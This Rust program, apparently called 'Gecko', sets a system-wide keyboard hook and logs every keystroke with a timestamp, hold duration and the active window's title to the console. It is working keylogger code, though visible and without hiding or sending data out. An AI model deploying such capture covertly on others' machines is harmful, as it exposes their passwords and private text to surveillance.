// use willhook::keyboard_hook;
// use std::sync::{Arc, atomic::{Ordering, AtomicBool}};

// fn main() {
//     let is_running = Arc::new(AtomicBool::new(true));
//     let set_running = is_running.clone();

//     let h = keyboard_hook().unwrap();

//     ctrlc::set_handler(move || {
//         set_running.store(false, Ordering::SeqCst);
//     })
//     .expect("Error setting Ctrl-C handler");

//     while is_running.load(Ordering::SeqCst) {
//         if let Ok(ie) = h.try_recv() {
//             match ie {
//                 willhook::InputEvent::Keyboard(ke) => println!("{:?}", ke.key),
//                 willhook::InputEvent::Mouse(me) => println!("{:?}", me),
//                 _ => println!("Input event: {:?}", ie),
//             }
//         } else {
//             std::thread::yield_now();   
//         }
//     };
// }

use std::collections::HashMap;
use std::time::{Instant, Duration};
use willhook::{KeyboardKey, keyboard_hook, InputEvent};
use winapi::um::winuser::{
    GetForegroundWindow, GetWindowTextLengthW, GetWindowTextW, VK_CONTROL,
    VK_SHIFT, VK_OEM_PLUS, GetAsyncKeyState,
};
use chrono::prelude::*;

fn main() {
    let h = keyboard_hook().unwrap();

    println!("Gecko is now gathering...");

    let mut key_states = HashMap::new();
    let mut last_title = String::new();

    loop {
        // Check for exit key combination
        if is_exit_key_pressed() {
            println!("Gecko goes to sleep...");
            break;
        }

        // Get active window title efficiently
        let title = get_active_window_title();

        // Process keyboard events efficiently
        while let Ok(ie) = h.try_recv() {
            match ie {
                InputEvent::Keyboard(ke) => {
                    if let Some(key) = ke.key {
                        handle_key_event(key, ke.pressed, &mut key_states, &title, &mut last_title);
                    }
                }
                _ => println!("Unknown Input event: {:?}", ie),
            }
        }
    }
}

fn is_exit_key_pressed() -> bool {
    unsafe {
        GetAsyncKeyState(VK_CONTROL) & 0x8000u16 as i16 != 0
            && GetAsyncKeyState(VK_SHIFT) & 0x8000u16 as i16 != 0
            && GetAsyncKeyState(VK_OEM_PLUS) & 0x8000u16 as i16 != 0
    }
}

fn get_active_window_title() -> String {
    unsafe {
        let active_window = GetForegroundWindow();
        let mut buffer: Vec<u16> = Vec::new();
        let len = GetWindowTextLengthW(active_window);
        buffer.resize((len + 1) as usize, 0); // Allocate enough space
        GetWindowTextW(active_window, buffer.as_mut_ptr(), len + 1);

        // Convert wide characters to string
        String::from_utf16_lossy(&buffer)
    }
}

fn handle_key_event(
    key: KeyboardKey,
    pressed: willhook::KeyPress,
    key_states: &mut HashMap<KeyboardKey, KeyHoldState>,
    title: &str,
    last_title: &mut String,
) {
    match pressed {
        willhook::KeyPress::Down(_) => {
            key_states.insert(
                key,
                KeyHoldState {
                    pressed: true,
                    pressed_time: Some(Instant::now()),
                    hold_duration: Duration::default(),
                },
            );
        }
        willhook::KeyPress::Up(_) => {
            if let Some(state) = key_states.get_mut(&key) {
                if let Some(pressed_time) = state.pressed_time {
                    let elapsed = Instant::now().duration_since(pressed_time);
                    if elapsed.subsec_millis() < 250 { // Skip instant keystrokes
                        state.hold_duration += elapsed;
                        log_key_press(title.to_string(), key, None);
                    }
                    else if elapsed.subsec_millis() > 250 {
                        state.hold_duration += elapsed;
                        log_key_press(title.to_string(), key, Some(state.hold_duration));
                    }
                    state.pressed = false;
                    state.pressed_time = None;
                }
            }
        }
        _ => {}
    }

    if title != *last_title {
        *last_title = title.to_string();
    }
}

fn log_key_press(title: String, key: KeyboardKey, hold_duration: Option<Duration>) {
    let local_now = Local::now();
    let local_time_string = local_now.format("%Y-%m-%d %H:%M:%S").to_string();
    match hold_duration {
        Some(hd) => {
            println!(
                "{} : {} : {:?} : Pressed and held for: {:?}",
                local_time_string, title, key, hd
            )
        },
        None => {
            println!("{} : {} : {:?} : Pressed", local_time_string, title, key)
        }

    }
}

struct KeyHoldState {
    pressed: bool,
    pressed_time: Option<Instant>,
    hold_duration: Duration,
}
